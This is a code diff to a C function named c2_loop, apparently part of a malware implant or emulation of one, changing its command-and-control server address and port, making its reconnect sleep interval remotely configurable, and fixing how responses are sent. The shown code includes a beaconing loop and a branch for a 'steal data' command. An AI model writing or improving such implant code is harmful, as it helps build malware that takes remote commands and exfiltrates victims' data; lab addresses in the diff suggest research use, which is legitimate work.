@@ -24,8 +24,8 @@ void c2_loop() {
     int sock2;
 		bool first_pkt = true;
     //int counter;
-    const char* server_name = "10.0.2.8";
-    const int server_port = 443;
+    const char* server_name = "127.0.0.1";
+    const int server_port = 1443;
 
     // setup sockets for initial packet
     struct sockaddr_in server_address;
@@ -40,13 +40,13 @@ void c2_loop() {
 
     if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
         fprintf(stderr, "could not create socket\n");
-        sleep(3);
+        sleep(sleepy_time);
         c2_loop();
     }
 
     if (connect(sock, (struct sockaddr*)&server_address, sizeof(server_address)) < 0) {
         fprintf(stderr, "[!] Could not connect to server...\n");
-        sleep(3);
+        sleep(sleepy_time);
         c2_loop();
     }
 
@@ -85,13 +85,13 @@ void c2_loop() {
 						// create new socket to send response
 						if ((sock2 = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
 								fprintf(stderr, "could not create socket\n");
-								sleep(3);
+								sleep(sleepy_time);
 								c2_loop();
 						}
 
 						if (connect(sock2, (struct sockaddr*)&server_address, sizeof(server_address)) < 0) {
 								fprintf(stderr, "[!] Could not connect to server...\n");
-								sleep(3);
+								sleep(sleepy_time);
 								c2_loop();
 						}
 
@@ -131,7 +131,9 @@ void c2_loop() {
 
             // convert c2 sleep time
             int new_sleepy_time;
-            memcpy(&new_sleepy_time, payload, sizeof(int));
+            int payload_sleep_time = atoi(payload);
+
+            memcpy(&new_sleepy_time, &payload_sleep_time, sizeof(int));
             // update c2 sleep time
             c2_set_timeout(&sleepy_time, new_sleepy_time);
             char *msg= "sleepy time updated !";
@@ -140,7 +142,7 @@ void c2_loop() {
             printf("New sleep time is: %d", sleepy_time);
             #endif
 
-            build_c2_response(msg, cmd_id, sock);
+            build_c2_response(msg, cmd_id, sock2);
         }
         else if (memcmp(&rota_c2_steal_data, cmd_id, 4) == 0) {
 
